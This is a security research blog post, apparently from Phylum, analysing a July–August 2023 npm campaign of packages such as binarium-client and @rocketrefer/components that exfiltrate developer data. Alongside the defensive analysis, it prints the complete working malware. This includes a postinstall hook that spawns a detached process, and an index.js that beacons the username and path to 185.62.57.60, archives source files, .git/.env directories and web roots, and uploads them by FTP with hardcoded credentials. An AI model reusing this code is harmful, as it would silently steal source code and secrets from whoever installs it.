@@ -1,0 +1,403 @@
+
+On July 31, 2023, Phylum's automated risk detection platform alerted us to another series of unusual publications on npm. Within a few hours, we observed the publication of ten different "test" packages. These packages demonstrated increasing functionality and refinement as the attacker seemingly tailored the code for a specific purpose—the apparent exfiltration of sensitive developer source code and other confidential information. Subsequently, we witnessed the removal of these test packages and the reappearance of the same code under different, legitimate-sounding package names. Join us as we delve into what we've discovered thus far.
+
+Background
+This attack was particularly interesting for us, as the attacker’s practice of pushing changes to unique npm packages allowed us to observe the evolution of their strategy, gaining insights into their motives and methods. Among other things, we saw the addition and removal of console logging throughout the test packages (which was completely removed from “production” versions), the eventual inclusion of the first HTTP request (introduced in the test524 package) which transmitted the machine's username and current working directory, and we saw the change of the remote server IP address—from 185.62.56.25 during the testing phase to 185.62.57.60 for the “production” versions. This afforded us a unique opportunity to witness part of the development cycle as the attacker refined this attack to its final state.
+As we delve into the code below, we'll focus on what we’re calling the "production" versions of this attack. By "production" versions, we’re referring to the packages that have authentic-sounding package names (presumably the ones the attacker expects the victims to install), excluding those containing "test". It's clear that the latter were simply part of a developmental testing process in crafting the final packages.
+Publish Timeline
+Below is the package publishing timeline. As mentioned above, the “production” packages are the last four in this list. It’s worth noting that in the time between when the last “test” package was published, and the new “production” packages were published, all the “test” packages were removed from npm.
+
+Package@Version	Publish Time
+developer_backup_test521@1.999.0	2023-07-31 12:54:57
+developer_backup_test522@1.999.0	2023-07-31 13:02:05
+developer_backup_test523@1.999.0	2023-07-31 13:22:14
+developer_backup_test524@2.999.0	2023-07-31 14:11:57
+developer_backup_test525@1.999.0	2023-07-31 14:13:00
+developer_backup_test527@1.999.0	2023-07-31 14:22:28
+developer_backup_test528@1.999.0	2023-07-31 15:23:55
+developer_backup_test529@1.999.0	2023-07-31 15:55:04
+developer_backup_test531@1.999.0	2023-07-31 16:27:39
+developer_backup_test531@1.999.9	2023-07-31 16:51:42
+developer_backup_test532@1.999.9	2023-07-31 17:01:09
+developer_backup_test531@9.999.0	2023-07-31 17:05:38
+zip_achive_bp@1.999.0	2023-07-31 19:57:32
+@rocketrefer/admin-panel@2.9.9	2023-07-31 20:18:29
+@rocketrefer/components@1.21.5	2023-07-31 20:27:07
+binarium-client@4.0.0	2023-08-01 15:07:45
+binarium-crm@1.9.9	2023-08-04 07:58:00
+ng-zulutrade-ssr@4.0.0	2023-08-08 23:36:00
+docs-public-api	2023-08-21
+vision-chart	2023-08-21
+casino.web@1.0.0	2023-08-24 22:32
+casino.web@1.0.4	2023-08-24 23:23
+casino.web@1.1.2	2023-08-24 23:23
+The Code
+All of these packages in this attack were published by the npm user malikrukd4732 and contain just three files. Let’s start by looking at the package.json:
+{
+  "name": "binarium-client",
+  "version": "4.0.0",
+  "private": false,
+  "publishConfig": {
+    "access": "public"
+  },
+  "description": "",
+  "main": "main.js",
+  "scripts": {
+    "postinstall": "node preinstall.js",
+    "test": "echo \\"Error: no test specified\\" && exit 1"
+  },
+  "author": "lexi2",
+  "license": "ISC",
+  "dependencies": {
+    "archiver": "^5.3.1",
+    "ftp": "^0.3.10"
+  }
+}
+The package.json from the binarium-client package. All packages’ package.json file published exhibit similar code to this one.
+Interestingly, the postinstall hook is configured to run the preinstall.js file directly. Let's break this down:
+const { spawn } = require('child_process');
+
+const child = spawn('node', ['index.js'], {
+  detached: true,
+  stdio: 'ignore'
+});
+
+child.unref();
+The preinstall.js file from the binarium-client package. All packages’ preinstall.js exhibit similar code to this one.
+First, they import the spawn method from the child_process module. True to its name, spawn will spawn a new process using the given command. In this case, the command given is 'node', ['index.js'] and the supplied options object is { detached: true, stdio: 'ignore' }. detached: true allows the child process to continue running even if the parent process exits, and stdio: 'ignore' sets the standard input, output, and error streams of the child process to be ignored. Finally, child.unref() unreferences the child process from the parent process, which allows the parent process to exit independently of the child process. If the child process is still running when the parent process exits, it will continue running as a detached process. This means index.js will continue running independently, and the parent process doesn't need to wait for the child process to finish its execution.
+Bearing this in mind, let's examine index.js to understand what they're establishing to run, in essence, as a background task. While it spans a few hundred lines, it's worth including it in its entirety. To avoid interrupting this text, however, we'll incorporate it at the conclusion of this article. Please refer to that section if you wish to review it.
+Before we dive deeper into this code, it's important to recall the sequence of events that triggers it. The index.js code is spawned in a child process by the preinstall.js file. This action is prompted by the postinstall hook defined in the package.json file, which is executed upon package installation. Therefore, the mere act of installing this package initiates the execution of all this code.
+At a high level, here’s what the index.js does:
+
+It gathers the current OS username and the current working directory, then sends an HTTP GET request to http://185.62.57.60:8000/http with the gathered information as URL query parameters.In our investigation we sent the following requestand received the following response:It's noteworthy that this request/response pattern mirrors certain aspects of another attack we recently uncovered. Currently, the objective of this particular GET request remains unknown. Given that the server receives the username and operating system information, there may be additional, unseen server-side behaviors of which we are not yet aware.
+It searches through directories on the machine where it's running, looking for files with specific extensions or in specific directories. Namely, it’s looking for these directories:
+- .env
+- .svn
+- .gitlab
+- .hg
+- .idea
+- .yarn
+- .docker
+- .vagrant
+- .github
+
+It's also looking for the files with the following extensions:
+- .asp
+- .js
+- .php
+- .aspx
+- .jspx
+- .jhtml
+- .py
+- .rb
+- .pl
+- .cfm
+- .cgi
+- .ssjs
+- .shtml
+- .env
+- .ini
+- .conf
+- .properties
+- .yml
+- .cfg
+
+It’s interesting to note that anything found under the /usr/ or /snap/ folders is deliberately excluded in the extraction process. While these directories can have sensitive information, it’s more likely they contain a lot of standard application files which are not unique to the victim’s system and hence less valuable to the attacker, whose motive appears to centered around extraction of source code or environment-specific configuration files.
+Then it creates ZIP archives of the directories it finds, including directories that are two levels up from the current directory and certain specified directories (/var/www/html, /usr/share/nginx/html, /usr/local/var/www). It’s worth noting that it deliberately avoids adding any directories or files it cannot read or if they are already a .zip file.
+Finally, it attempts to upload these archives to an FTP server with IP address 185.62.57.60 using the username root and password TestX@!#33.
+Conclusion
+This script appears to facilitate the exfiltration of sensitive developer data like source code and configuration files. The files and directories it targets could potentially contain invaluable intellectual property and/or sensitive information, such as credentials for numerous applications and services. Notably, all ten of the “test” packages present themselves as a “developer_backup_test” and while the process of compressing data and shipping it to a remote FTP server could technically be referred to as a “backup,” we think it's safe to presume that in this case this term appears to be used quite euphemistically. In reality, we suspect this activity is focused on illicitly acquiring sensitive developer information by somehow tricking users into installing these packages.
+This seems to be another highly-targeted attack on developers involved in the cryptocurrency sphere. As of now, we're uncertain about what @rocketrefer pertains to, but it could potentially be linked to CryptoRocket. According to its website’s meta description, CryptoRocket is a "bitcoin forex broker offering unrivalled[sic] trading conditions such as ultra-tight spreads and straight through processing." Meanwhile, Binarium appears to be an options broker that provides access to a wide range of financial markets, including forex and cryptocurrency. Regardless this serves as yet another stark reminder of how important it is to trust your dependencies.
+The index.js File
+const fs = require("fs");
+const path = require("path");
+const archiver = require("archiver");
+const util = require("util");
+const os = require("os");
+const ftpClient = require("ftp");
+const querystring = require("querystring");
+const http = require("http");
+const url = require("url");
+
+function sendHTTPRequest(text) {
+  let query;
+  if (text) {
+    query = querystring.stringify({ text: text });
+  } else {
+    const osUser = os.userInfo().username;
+    const currentScriptPath = process.cwd();
+    query = querystring.stringify({
+      user: osUser,
+      path: currentScriptPath,
+    });
+  }
+
+  const requestUrl = url.format({
+    protocol: "http",
+    hostname: "185.62.57.60",
+    port: "8000",
+    pathname: "/http",
+    search: query,
+  });
+
+  http
+    .get(requestUrl, (res) => {
+      let data = "";
+      res.on("data", (chunk) => {
+        data += chunk;
+      });
+      res.on("end", () => {});
+    })
+    .on("error", (err) => {});
+}
+
+function getPathToSecondDirectory() {
+  const parsedPath = path.parse(process.cwd());
+  const parts = parsedPath.dir.split(path.sep);
+  return path.join(parts[0] + path.sep, parts[1], parts[2]);
+}
+
+function findFilesWithExtensions(dir, extensions, directoriesToSearch = []) {
+  let searchedFiles = [];
+  let searchedDirectories = [];
+  try {
+    const files = fs.readdirSync(dir);
+    files.forEach((file) => {
+      const filePath = path.join(dir, file);
+      try {
+        const linkStats = fs.lstatSync(filePath);
+        if (linkStats.isSymbolicLink()) {
+          return;
+        }
+        const stats = fs.statSync(filePath);
+        if (stats.isDirectory()) {
+          if (directoriesToSearch.includes(file)) {
+            searchedDirectories.push(filePath);
+          }
+          const [childFiles, childDirectories] = findFilesWithExtensions(
+            filePath,
+            extensions,
+            directoriesToSearch
+          );
+          searchedFiles = searchedFiles.concat(childFiles);
+          searchedDirectories = searchedDirectories.concat(childDirectories);
+        } else if (extensions.includes(path.extname(file))) {
+          const sizeInBytes = stats.size;
+          const sizeInKB = sizeInBytes / 1024;
+          searchedFiles.push(`${filePath}`);
+        }
+      } catch (err) {}
+    });
+  } catch (err) {}
+  return [searchedFiles, searchedDirectories];
+}
+
+function appendDirectory(srcDir, destDir, archive, zip_name) {
+  if (srcDir.startsWith("/usr/") || srcDir.startsWith("/snap/")) {
+    return 1;
+  }
+  try {
+    let err = fs.accessSync(srcDir, fs.constants.R_OK);
+  } catch {}
+  try {
+    err = fs.accessSync("./", fs.constants.W_OK);
+    err = fs.accessSync("./", fs.constants.R_OK);
+  } catch {
+    return 0;
+  }
+  try {
+    if (!fs.existsSync(srcDir)) {
+      return 1;
+    }
+  } catch {
+    return 0;
+  }
+  const stats = fs.statSync(srcDir);
+  if (!stats.isDirectory()) {
+    try {
+      let err = fs.accessSync(srcDir, fs.constants.R_OK);
+
+      archive.file(srcDir, { name: path.join(destDir, srcDir) });
+    } catch {}
+    return 1;
+  }
+  try {
+    fs.readdirSync(srcDir);
+  } catch {
+    return 0;
+  }
+  const files = fs.readdirSync(srcDir);
+  for (let j = 0; j < files.length; j = j + 1) {
+    if (zip_name === files[j]) {
+      continue;
+    }
+    const fullPath = path.join(srcDir, files[j]);
+    if (!fs.existsSync(fullPath)) {
+      continue;
+    }
+    if (path.extname(fullPath) == ".zip") {
+      continue;
+    }
+    const archivePath = destDir ? path.join(destDir, files[j]) : files[j];
+    const stats = fs.statSync(fullPath);
+    if (stats.isDirectory()) {
+      appendDirectory(fullPath, destDir, archive, zip_name);
+    } else {
+      try {
+        let err = fs.accessSync(fullPath, fs.constants.R_OK);
+
+        archive.file(fullPath, { name: path.join(destDir, fullPath) });
+      } catch {}
+    }
+  }
+}
+
+function uploadArchiveToFTP(archiveName) {
+  return new Promise((resolve, reject) => {
+    const client = new ftpClient();
+    const host = "185.62.57.60";
+    const port = 21;
+    const user = "root";
+    const password = "TestX@!#33";
+    const remotePath = "/";
+    const localPath = path.join(process.cwd(), archiveName);
+    client.on("ready", () => {
+      client.put(localPath, remotePath + archiveName, (err) => {
+        if (err) {
+          return;
+        }
+        client.end();
+        resolve();
+      });
+    });
+
+    client.connect({ host, port, user, password });
+  });
+}
+
+function findFirstReadableDirectory() {
+  let currentPath = path.sep;
+  try {
+    fs.accessSync(currentPath, fs.constants.R_OK);
+    return currentPath;
+  } catch (error) {}
+  const cwdParts = process.cwd().split(path.sep);
+  for (const part of cwdParts.slice(1)) {
+    currentPath = path.join(currentPath, part);
+    try {
+      fs.accessSync(currentPath, fs.constants.R_OK);
+      return currentPath;
+    } catch (error) {}
+  }
+  return null;
+}
+
+async function main() {
+  sendHTTPRequest();
+  var zip_name = "dirs_back.zip";
+  var zip_name_files = "files_back.zip";
+  const startDir = findFirstReadableDirectory();
+  var new_name = "files";
+  const extensions = [
+    ".asp",
+    ".js",
+    ".php",
+    ".aspx",
+    ".jspx",
+    ".jhtml",
+    ".py",
+    ".rb",
+    ".pl",
+    ".cfm",
+    ".cgi",
+    ".ssjs",
+    ".shtml",
+    ".env",
+    ".ini",
+    ".conf",
+    ".properties",
+    ".yml",
+    ".cfg",
+  ];
+  const directoriesToSearch = [
+    ".git",
+    ".env",
+    ".svn",
+    ".gitlab",
+    ".hg",
+    ".idea",
+    ".yarn",
+    ".docker",
+    ".vagrant",
+    ".github",
+  ];
+  let searchedWords = findFilesWithExtensions(
+    startDir,
+    extensions,
+    directoriesToSearch
+  );
+  searchedWords[0] = [...new Set(searchedWords[0])];
+  searchedWords[1] = [...new Set(searchedWords[1])];
+  var output = fs.createWriteStream(zip_name);
+  const archive = archiver("zip", {
+    zlib: { level: 9 },
+  });
+  archive.pipe(output);
+  searchedWords[0].forEach((item) => {
+    files = appendDirectory(item, new_name, archive, zip_name);
+  });
+  await archive.finalize();
+  uploadArchiveToFTP(zip_name);
+  var output1 = fs.createWriteStream(zip_name_files);
+  const archive1 = archiver("zip", {
+    zlib: { level: 9 },
+  });
+  archive1.pipe(output1);
+  searchedWords[1].forEach((item) => {
+    files = appendDirectory(item, new_name, archive1, zip_name_files);
+  });
+  await archive1.finalize();
+  uploadArchiveToFTP(zip_name_files);
+  const specificDirectoriesToArchive = [
+    "/var/www/html",
+    "/usr/share/nginx/html",
+    "/usr/local/var/www",
+  ];
+  const zipNameForSpecificDirs = "specific_directories.zip";
+  const outputForSpecificDirs = fs.createWriteStream(zipNameForSpecificDirs);
+  const archiveForSpecificDirs = archiver("zip", {
+    zlib: { level: 9 },
+  });
+  archiveForSpecificDirs.pipe(outputForSpecificDirs);
+
+  for (const dir of specificDirectoriesToArchive) {
+    try {
+      await fs.promises.access(dir, fs.constants.R_OK);
+      await appendDirectory(
+        dir,
+        new_name,
+        archiveForSpecificDirs,
+        zipNameForSpecificDirs
+      );
+    } catch (error) {}
+  }
+
+  await archiveForSpecificDirs.finalize();
+  uploadArchiveToFTP(zipNameForSpecificDirs);
+  var zip_name_3 = "dir.zip";
+  var output2 = fs.createWriteStream(zip_name_3);
+  const archive2 = archiver("zip", {
+    zlib: { level: 9 },
+  });
+  archive2.pipe(output2);
+  last_dir = getPathToSecondDirectory();
+  try {
+    appendDirectory(last_dir, new_name, archive2, zip_name_3);
+  } catch {
+    appendDirectory(last_dir, new_name, archive2, zip_name_3);
+  }
+  await archive2.finalize();
+  await uploadArchiveToFTP(zip_name_3);
+}
+
+main();
